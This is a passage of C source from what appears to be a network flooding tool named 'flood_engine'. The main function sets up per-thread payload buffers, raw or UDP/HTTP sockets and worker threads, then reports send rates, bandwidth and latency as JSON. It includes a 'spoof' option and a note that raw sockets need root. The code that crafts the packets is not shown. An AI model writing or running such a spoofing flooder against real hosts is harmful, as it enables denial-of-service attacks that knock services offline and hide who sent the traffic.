        w->payload = malloc((size_t)cfg.size + 1);
        w->arena = malloc((size_t)cfg.burst * MAX_PKT);
        w->iov   = calloc((size_t)cfg.burst, sizeof(struct iovec));
        w->msgs  = calloc((size_t)cfg.burst, sizeof(struct mmsghdr));
        if (!w->payload || !w->arena || !w->iov || !w->msgs) {
            fprintf(stderr, "flood_engine: out of memory\n");
            return 1;
        }
        size_t ptxt = strlen(cfg.payload_txt);
        for (int k = 0; k < cfg.size; k++) {
            w->payload[k] = ptxt ? (unsigned char)cfg.payload_txt[(size_t)k % ptxt] : 0x41;
        }
        w->payload[cfg.size] = 0;

        int perm = 0;
        w->fd = open_flood_socket(&cfg, &perm);
        if (perm) atomic_store(&g_perm, 1);
        if (w->fd < 0 && cfg.mode != M_HTTP) {
            fprintf(stderr, "flood_engine: socket() failed: %s\n", strerror(errno));
            return atomic_load(&g_perm) ? 3 : 1;
        }
    }

    pthread_t mon;
    bool mon_started = false;
    if (cfg.progress_ms > 0) {
        if (pthread_create(&mon, NULL, monitor, &cfg.progress_ms) == 0) mon_started = true;
    }
    for (int i = 0; i < cfg.threads; i++) {
        if (pthread_create(&g_workers[i].tid, NULL, worker, &g_workers[i]) != 0) {
            atomic_store(&g_stop, 1);
            fprintf(stderr, "flood_engine: pthread_create failed\n");
            return 1;
        }
    }
    for (int i = 0; i < cfg.threads; i++) pthread_join(g_workers[i].tid, NULL);
    atomic_store(&g_stop, 1);
    if (mon_started) pthread_join(mon, NULL);

    double elapsed = now_s() - g_start_s;
    if (elapsed <= 0.0) elapsed = 1e-6;

    uint64_t sent = 0, err = 0, bytes = 0, lat_n = 0;
    for (int i = 0; i < cfg.threads; i++) {
        sent  += g_workers[i].sent;
        err   += g_workers[i].errors;
        bytes += g_workers[i].bytes;
        lat_n += g_workers[i].lat_n;
    }

    static double lat[LAT_SAMPLES * HARD_MAX_THREADS];
    size_t ln = 0;
    for (int i = 0; i < cfg.threads; i++) {
        for (uint64_t k = 0; k < g_workers[i].lat_n && k < LAT_SAMPLES; k++) {
            if (ln < sizeof(lat) / sizeof(lat[0])) lat[ln++] = g_workers[i].lat_us[k];
        }
    }
    qsort(lat, ln, sizeof(double), cmp_double);

    char esc_host[512], target[560];
    json_escape(cfg.host, esc_host, sizeof(esc_host));
    if (needs_port) snprintf(target, sizeof(target), "%s:%d", esc_host, cfg.port);
    else snprintf(target, sizeof(target), "%s", esc_host);

    uint64_t total = sent + err;
    double err_rate = total ? (double)err / (double)total : 0.0;

    printf("{\"type\":\"result\",\"engine\":\"flood\",\"mode\":\"%s\",\"target\":\"%s\","
           "\"method\":\"%s\",\"duration_s\":%.3f,\"requests\":%llu,\"ok\":%llu,\"errors\":%llu,"
           "\"achieved_rps\":%.2f,\"error_rate\":%.4f,\"bytes_sent\":%llu,\"mbps\":%.3f,"
           "\"spoof\":%s,\"tls\":%s,\"keepalive\":%d,\"payload_bytes\":%d,\"threads\":%d,\"burst\":%d,"
           "\"latency_ms\":{\"p50\":%.3f,\"p90\":%.3f,\"p99\":%.3f,\"max\":%.3f},"
           "\"note\":\"%s\"}\n",
           mode_name(cfg.mode), target, cfg.method, elapsed,
           (unsigned long long)total, (unsigned long long)sent, (unsigned long long)err,
           (double)total / elapsed, err_rate,
           (unsigned long long)bytes, (double)bytes * 8.0 / elapsed / 1e6,
           cfg.spoof ? "true" : "false", cfg.tls ? "true" : "false", cfg.keepalive,
           cfg.size, cfg.threads, cfg.burst,
           percentile(lat, ln, 50) / 1000.0, percentile(lat, ln, 90) / 1000.0,
           percentile(lat, ln, 99) / 1000.0, ln ? lat[ln - 1] / 1000.0 : 0.0,
           lat_n ? "latency measured end-to-end per request"
                 : "fire-and-forget: ok counts packets accepted by the kernel, not replies");

    for (int i = 0; i < cfg.threads; i++) {
        free(g_workers[i].payload);
        free(g_workers[i].arena);
        free(g_workers[i].iov);
        free(g_workers[i].msgs);
    }
    free(g_workers);
    if (g_ctx) SSL_CTX_free(g_ctx);

    if (atomic_load(&g_perm) && cfg.mode != M_HTTP) {
        fprintf(stderr, "flood_engine: raw sockets need root or CAP_NET_RAW — run with sudo or use udp/http\n");
        return 3;
    }
    return 0;
}